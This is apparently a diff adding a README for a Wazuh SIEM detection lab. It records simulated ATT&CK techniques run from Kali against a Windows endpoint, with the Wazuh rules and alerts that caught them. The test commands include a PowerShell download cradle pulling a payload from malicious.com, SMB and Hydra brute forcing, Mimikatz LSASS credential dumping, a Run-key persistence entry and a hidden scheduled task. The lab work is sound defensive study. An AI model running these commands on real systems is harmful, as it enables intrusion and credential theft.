@@ -1,0 +1,302 @@
+# 🛡️ SIEM Detection Lab: Wazuh Implementation
+
+Comprehensive documentation of a virtualized Security Operations Center (SOC) environment implementing Wazuh SIEM for threat detection and security monitoring. This lab demonstrates enterprise security monitoring capabilities, adversary emulation, and incident detection patterns.
+
+## 📋 Table of Contents
+- [Project Overview](#project-overview)
+- [Infrastructure Architecture](#infrastructure-architecture)
+- [Environment Configuration](#environment-configuration)
+- [Threat Simulation Results](#threat-simulation-results)
+- [Detection Coverage](#detection-coverage)
+- [Key Findings](#key-findings)
+- [Technical Challenges](#technical-challenges)
+- [Future Enhancements](#future-enhancements)
+
+## 🎯 Project Overview
+
+This project documents the deployment and testing of a Wazuh SIEM solution in a controlled lab environment. The infrastructure enables real-time security monitoring, threat detection, and incident response capabilities across Windows endpoints.
+
+**Objectives Achieved:**
+- Deployed production-grade SIEM infrastructure using Wazuh 4.7
+- Implemented comprehensive endpoint logging with Sysmon integration
+- Validated detection coverage across MITRE ATT&CK framework techniques
+- Documented detection effectiveness for common attack patterns
+- Established baseline security monitoring capabilities
+
+**Environment**: Proxmox virtualized infrastructure with isolated network segments
+
+## 🏗️ Infrastructure Architecture
+
+```
+┌─────────────────────────────────────────────────────┐
+│            Proxmox Hypervisor (vmbr0)               │
+├─────────────────────────────────────────────────────┤
+│                                                     │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────┐ │
+│  │   Wazuh      │  │   Windows    │  │  Kali    │ │
+│  │   Manager    │  │   Endpoint   │  │  Linux   │ │
+│  │              │  │              │  │          │ │
+│  │  - Indexer   │◄─┤  - Sysmon    │◄─┤ Red Team │ │
+│  │  - Dashboard │  │  - Agent     │  │ Arsenal  │ │
+│  │  - API       │  │  - Enhanced  │  │          │ │
+│  │              │  │    Logging   │  │          │ │
+│  └──────────────┘  └──────────────┘  └──────────┘ │
+│                                                     │
+│  192.168.1.x/24 Network Segment                    │
+└─────────────────────────────────────────────────────┘
+```
+
+
+
+### Infrastructure Components
+
+| Component | Specifications | Role | IP Assignment |
+|-----------|---------------|------|---------------|
+| Wazuh Manager | Ubuntu Server 22.04, 8GB RAM, 4 vCPU, 50GB | SIEM platform, log aggregation, alerting | Static IP |
+| Windows Endpoint | Windows 10/11 Pro, 4GB RAM, 2 vCPU, 60GB | Monitored target, log generation | DHCP/Static |
+| Kali Linux | Kali 2024.x, 2GB RAM, 2 vCPU, 40GB | Adversary simulation platform | DHCP/Static |
+
+### Network Configuration
+
+- **Network Type**: Bridged (vmbr0)
+- **Subnet**: 192.168.1.0/24
+- **Isolation**: Lab traffic shares host network (production environments should use isolated VLANs)
+- **Firewall**: Windows Firewall configured to allow agent communication (port 1514/TCP)
+
+> **📸 Screenshot Location:** `/screenshots/proxmox-vm-hardware.png` - VM hardware configuration
+
+## 📥 Environment Configuration
+
+### Wazuh SIEM Deployment
+
+**Platform**: All-in-one deployment (Manager, Indexer, Dashboard)
+**Version**: Wazuh 4.7.x
+
+Installation method:
+```bash
+curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
+sudo bash ./wazuh-install.sh -a -i
+```
+
+**Configuration Notes:**
+- Default admin credentials generated during installation
+- Dashboard accessible via HTTPS on port 443
+- Agent communication configured on port 1514/TCP
+- Self-signed certificates used (lab environment)
+
+> **📸 Screenshot Location:** `/screenshots/wazuh-dashboard-login.png` - Wazuh dashboard interface
+
+### Windows Endpoint Configuration
+
+**Logging Enhancement Strategy:**
+
+1. **Sysmon Implementation** (SwiftOnSecurity configuration)
+   - Process creation monitoring (Event ID 1)
+   - Network connections (Event ID 3)
+   - Process access/LSASS monitoring (Event ID 10)
+   - Registry modifications (Event ID 13)
+   - File creation monitoring (Event ID 11)
+
+2. **PowerShell Script Block Logging**
+   - Captures all PowerShell commands executed
+   - Critical for detecting malicious scripts
+   - Configured via Group Policy / Registry
+
+3. **Wazuh Agent Configuration**
+   ```xml
+   <localfile>
+     <location>Microsoft-Windows-Sysmon/Operational</location>
+     <log_format>eventchannel</log_format>
+   </localfile>
+   ```
+
+4. **Security Hardening Modifications (Lab Only)**
+   - Account lockout policy disabled (`net accounts /lockoutthreshold:0`)
+   - Remote admin share access enabled (LocalAccountTokenFilterPolicy)
+   - Windows Defender temporarily disabled for testing
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/sysmon-event-viewer.png` - Sysmon operational logs
+> - `/screenshots/wazuh-agent-config.png` - Agent configuration file
+> - `/screenshots/windows-agent-status.png` - Agent connected status in dashboard
+
+### Kali Linux Attack Platform
+
+**Tools Installed:**
+- Nmap (network reconnaissance)
+- Hydra (credential brute-forcing)
+- Metasploit Framework (exploitation)
+- CrackMapExec (lateral movement simulation)
+- smbclient (SMB enumeration)
+
+**Network Configuration:**
+- Same subnet as target endpoint
+- Static IP assigned for consistent logging
+- Full internet access for tool updates
+
+## ⚔️ Threat Simulation Results
+
+### Test Methodology
+
+Adversary techniques were simulated following the MITRE ATT&CK framework across multiple tactics: Reconnaissance, Initial Access, Execution, Persistence, Credential Access, and Lateral Movement. Each technique was executed from the Kali Linux platform against the Windows endpoint.
+
+### 1. Network Reconnaissance (TA0043)
+
+**Technique**: Active Scanning (T1595)
+
+**Implementation:**
+```bash
+nmap -sV -sC 192.168.1.199
+sudo nmap -sS -T4 -p- 192.168.1.199
+```
+
+**Detection Results:**
+- ✅ Sysmon Event ID 3 captured incoming connections
+- ✅ Multiple network connection events correlated
+- ⚠️ Required custom rule tuning for port scan detection
+- Detection rate: High (with proper correlation rules)
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/nmap-scan-output.png` - Nmap scan results
+> - `/screenshots/siem-port-scan-detection.png` - Wazuh alert for reconnaissance activity
+
+**Key Finding**: Default Wazuh configuration does not aggressively flag port scans. Custom rule created:
+```xml
+<rule id="100200" level="10">
+  <if_group>sysmon_event3</if_group>
+  <description>Port scan detected - Multiple connection attempts</description>
+  <same_source_ip />
+  <different_dstport />
+  <frequency>10</frequency>
+  <timeframe>60</timeframe>
+</rule>
+```
+
+---
+
+### 2. Brute Force Attack (T1110)
+
+**Technique**: Password Guessing against SMB and RDP
+
+**Implementation:**
+```bash
+# SMB brute force
+for i in {1..10}; do
+  smbclient //192.168.1.199/C$ -U Administrator%WrongPassword$i
+  sleep 2
+done
+
+# RDP brute force
+hydra -l Administrator -P passwords.txt rdp://192.168.1.199 -t 1
+```
+
+**Detection Results:**
+- ✅ **Rule 60122**: Multiple Windows authentication failures
+- ✅ **Event ID 4625**: Failed logon attempts (Type 3 for SMB, Type 10 for RDP)
+- ✅ Source IP correctly identified in alerts
+- Detection rate: 100%
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/brute-force-attack-terminal.png` - Hydra/smbclient output
+> - `/screenshots/siem-brute-force-alerts.png` - Wazuh authentication failure alerts
+> - `/screenshots/event-4625-details.png` - Windows Security Event Log detail
+
+**Challenge Encountered**: 
+- Account lockout policy triggered after default threshold (5 attempts)
+- Required disabling lockout for continued testing: `net accounts /lockoutthreshold:0`
+- RDP module in Hydra experienced connection instability
+
+---
+
+### 3. PowerShell Execution (T1059.001)
+
+**Technique**: Command and Scripting Interpreter - PowerShell
+
+**Implementation:**
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
+powershell -encodedcommand "dwBoAG8AYQBtAGkA"
+powershell -ExecutionPolicy Bypass -Command "Get-Process"
+```
+
+**Detection Results:**
+- ✅ **Rule 91816**: Suspicious PowerShell script detected
+- ✅ Script Block Logging captured full command text
+- ✅ Download cradle pattern recognized
+- ✅ Encoded command execution flagged
+- Detection rate: 100%
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/powershell-malicious-command.png` - PowerShell execution
+> - `/screenshots/siem-powershell-alert.png` - Wazuh PowerShell detection alert
+> - `/screenshots/script-block-logging.png` - PowerShell Event Log (Event ID 4104)
+
+**Key Finding**: PowerShell logging is critical. Without Script Block Logging enabled, command content would be invisible to SIEM.
+
+---
+
+### 4. Credential Dumping (T1003)
+
+**Technique**: OS Credential Dumping - LSASS Memory (T1003.001)
+
+**Implementation:**
+```powershell
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+**Detection Results:**
+- ✅ **Rule 61603**: Mimikatz usage detected
+- ✅ **Sysmon Event ID 10**: LSASS process access
+- ✅ Process name "mimikatz.exe" flagged
+- Detection rate: 100%
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/mimikatz-execution.png` - Mimikatz credential dump
+> - `/screenshots/siem-mimikatz-alert.png` - Wazuh credential dumping alert
+> - `/screenshots/sysmon-lsass-access.png` - Sysmon Event ID 10 showing LSASS access
+
+**Key Finding**: Sysmon's LSASS access monitoring is essential for detecting credential theft attempts.
+
+---
+
+### 5. Persistence - Registry Run Keys (T1547.001)
+
+**Technique**: Boot or Logon Autostart Execution - Registry Run Keys
+
+**Implementation:**
+```powershell
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d "C:\evil.exe"
+```
+
+**Detection Results:**
+- ✅ **Sysmon Event ID 13**: Registry value set detected
+- ✅ Run key modification flagged
+- ✅ Value name and data captured in logs
+- Detection rate: High
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/registry-persistence.png` - Registry modification command
+> - `/screenshots/siem-registry-alert.png` - Wazuh registry change alert
+
+---
+
+### 6. Scheduled Task Creation (T1053.005)
+
+**Technique**: Scheduled Task/Job
+
+**Implementation:**
+```powershell
+schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden" /sc onlogon /ru System
+```
+
+**Detection Results:**
+- ✅ **Event ID 4698**: Scheduled task created
+- ✅ Task name and command captured
+- ✅ Suspicious task parameters detected
+- Detection rate: High
+
+> **📸 Screenshot Location:** 
+> - `/screenshots/scheduled-task-creation.png` - schtasks command
+> - `/screenshots/siem-scheduled-task-alert.png` - Wazuh scheduled task alert
